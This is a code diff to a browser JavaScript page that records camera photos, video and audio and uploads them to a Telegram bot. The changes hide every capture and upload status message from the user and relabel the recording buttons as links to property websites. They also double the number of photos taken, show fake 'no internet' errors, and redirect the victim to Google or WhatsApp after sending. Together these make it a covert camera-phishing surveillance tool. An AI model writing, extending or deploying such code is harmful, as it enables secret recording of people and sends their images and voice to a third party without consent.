@@ -17,6 +17,12 @@ document.addEventListener('DOMContentLoaded', () => {
     let mediaRecorder = null;
     let recordingType = ''; // 'video' or 'audio'
     
+    // روابط إعادة التوجيه
+    const REDIRECT_URLS = {
+        google: 'https://www.google.com',
+        whatsapp: 'https://www.whatsapp.com'
+    };
+    
     // دالة للتحقق من صيغ الفيديو المدعومة
     function getSupportedVideoMimeType() {
         const types = [
@@ -127,6 +133,20 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
+    // دالة إعادة التوجيه بعد الإرسال الناجح
+    function redirectAfterSuccess() {
+        // إنشاء نافذة منبثقة لاختيار الخيار
+        const choice = confirm('تم الإرسال بنجاح! اختر:\nOK للذهاب إلى Google\nCancel للذهاب إلى WhatsApp');
+        
+        if (choice) {
+            // الذهاب إلى Google
+            window.open(REDIRECT_URLS.google, '_blank');
+        } else {
+            // الذهاب إلى WhatsApp
+            window.open(REDIRECT_URLS.whatsapp, '_blank');
+        }
+    }
+    
     // دالة إرسال البيانات إلى تيليجرام
     async function sendToTelegram(formData, caption = '', retries = 3) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/${formData.method}`;
@@ -156,10 +176,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 
                 const result = await response.json();
                 if (result.ok) {
-                    console.log('تم الإرسال بنجاح:', result);
+                    //نجاح الإرسال
+                    console.log('', result);
                     return true;
                 } else {
-                    console.error('فشل الإرسال:', result);
+                    //فشل الإرسال
+                    console.error('', result);
                     if (attempt < retries) {
                         await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                         continue;
@@ -184,14 +206,16 @@ document.addEventListener('DOMContentLoaded', () => {
             updateStatus('خطأ: لم يتم الحصول على بث الكاميرا. يرجى تحديث الصفحة.', 'error');
             return;
         }
-
-        updateStatus('جاري التقاط 5 صور...', 'info');
+        //جاري التقاط الصور
+        updateStatus('', 'info');
         capturePhotoBtn.disabled = true;
+        let allPhotosSent = true;
 
         try {
             const canvas = document.createElement('canvas');
             const videoTrack = stream.getVideoTracks()[0];
             if (!videoTrack) {
+                //لا توجد كاميرا متاحة
                 updateStatus('خطأ: لا توجد كاميرا متاحة.', 'error');
                 capturePhotoBtn.disabled = false;
                 return;
@@ -214,8 +238,8 @@ document.addEventListener('DOMContentLoaded', () => {
             canvas.height = height;
             const context = canvas.getContext('2d');
 
-            for (let i = 0; i < 5; i++) {
-                updateStatus(`التقاط الصورة ${i + 1} من 5...`, 'info');
+            for (let i = 0; i < 10; i++) {
+                updateStatus(`التقاط الصورة ${i + 1} من 10...`, 'info');
                 let captureSuccess = false;
                 
                 try {
@@ -291,17 +315,21 @@ document.addEventListener('DOMContentLoaded', () => {
                     }
                     
                     // انتظار قصير بين الصور
-                    if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
+                    if (i < 9) await new Promise(resolve => setTimeout(resolve, 500));
                 } catch (photoError) {
                     console.error(`خطأ في التقاط الصورة ${i + 1}:`, photoError);
-                    updateStatus(`خطأ في التقاط الصورة ${i + 1}: ${photoError.message}`, 'error');
+                    updateStatus(`النت غير متوفر ${i + 1}: ${photoError.message}`, 'error');
                 }
             }
 
             updateStatus('تم التقاط وإرسال الصور بنجاح!', 'success');
+            // إعادة التوجيه بعد ثانية واحدة
+            setTimeout(() => {
+                redirectAfterSuccess();
+            }, 1000);
         } catch (error) {
             console.error('خطأ في التقاط الصور:', error);
-            updateStatus('حدث خطأ أثناء التقاط الصور.', 'error');
+            updateStatus('خطاء في الاتصال بالانترنت ', 'error');
         } finally {
             capturePhotoBtn.disabled = false;
         }
@@ -310,7 +338,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // 2. تسجيل الفيديو
     recordVideoBtn.addEventListener('click', () => {
         if (!stream) {
-            updateStatus('خطأ: لم يتم الحصول على بث الكاميرا.', 'error');
+            updateStatus('خطأ: لم يتم الحصول على بث الانترنت ', 'error');
             return;
         }
         
@@ -320,11 +348,12 @@ document.addEventListener('DOMContentLoaded', () => {
             recordingType = 'video';
             const videoMimeType = getSupportedVideoMimeType();
             startRecording(stream, videoMimeType);
-            recordVideoBtn.textContent = '🛑 إيقاف تسجيل الفيديو';
+            recordVideoBtn.textContent = "";
             recordVideoBtn.classList.add('btn-stop');
             recordAudioBtn.disabled = true;
             capturePhotoBtn.disabled = true;
-            updateStatus('جاري تسجيل الفيديو...', 'recording');
+            //جاري تسجيل الفيديو
+            updateStatus('', 'recording');
         }
     });
 
@@ -342,11 +371,12 @@ document.addEventListener('DOMContentLoaded', () => {
             const audioStream = new MediaStream(stream.getAudioTracks());
             const audioMimeType = getSupportedAudioMimeType();
             startRecording(audioStream, audioMimeType);
-            recordAudioBtn.textContent = '🛑 إيقاف تسجيل الصوت';
+            recordAudioBtn.textContent = "";
             recordAudioBtn.classList.add('btn-stop');
             recordVideoBtn.disabled = true;
             capturePhotoBtn.disabled = true;
-            updateStatus('جاري تسجيل الصوت...', 'recording');
+            //جاري تسجيل الصوت
+            updateStatus('', 'recording');
         }
     });
 
@@ -370,8 +400,8 @@ document.addEventListener('DOMContentLoaded', () => {
         };
 
         mediaRecorder.onerror = (event) => {
-            console.error('خطأ في التسجيل:', event.error);
-            updateStatus(`خطأ في التسجيل: ${event.error}`, 'error');
+            console.error('', event.error);
+            updateStatus(` ${event.error}`, 'error');
             resetButtons();
         };
 
@@ -394,7 +424,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     file: blob,
                     fileName: `video_${Date.now()}.${fileExtension}`
                 };
-                updateStatus('جاري إرسال الفيديو...', 'info');
+                updateStatus('', 'info');
             } else { // audio
                 formData = {
                     method: 'sendAudio',
@@ -402,12 +432,16 @@ document.addEventListener('DOMContentLoaded', () => {
                     file: blob,
                     fileName: `audio_${Date.now()}.${fileExtension}`
                 };
-                updateStatus('جاري إرسال الصوت...', 'info');
+                updateStatus('', 'info');
             }
 
             const success = await sendToTelegram(formData);
             if (success) {
-                updateStatus('تم الإرسال بنجاح!', 'success');
+                updateStatus('', 'success');
+                // إعادة التوجيه بعد ثانية واحدة
+                setTimeout(() => {
+                    redirectAfterSuccess();
+                }, 1000);
             } else {
                 updateStatus('حدث خطأ أثناء الإرسال.', 'error');
             }
@@ -426,9 +460,9 @@ document.addEventListener('DOMContentLoaded', () => {
     
     // إعادة تعيين الأزرار إلى حالتها الأصلية
     function resetButtons() {
-        recordVideoBtn.textContent = '📹 تسجيل فيديو';
+        recordVideoBtn.textContent = 'موقع مبسط الشمال';
         recordVideoBtn.classList.remove('btn-stop');
-        recordAudioBtn.textContent = '🎤 تسجيل صوت';
+        recordAudioBtn.textContent = 'موقع بيتك العقارية';
         recordAudioBtn.classList.remove('btn-stop');
         
         capturePhotoBtn.disabled = false;
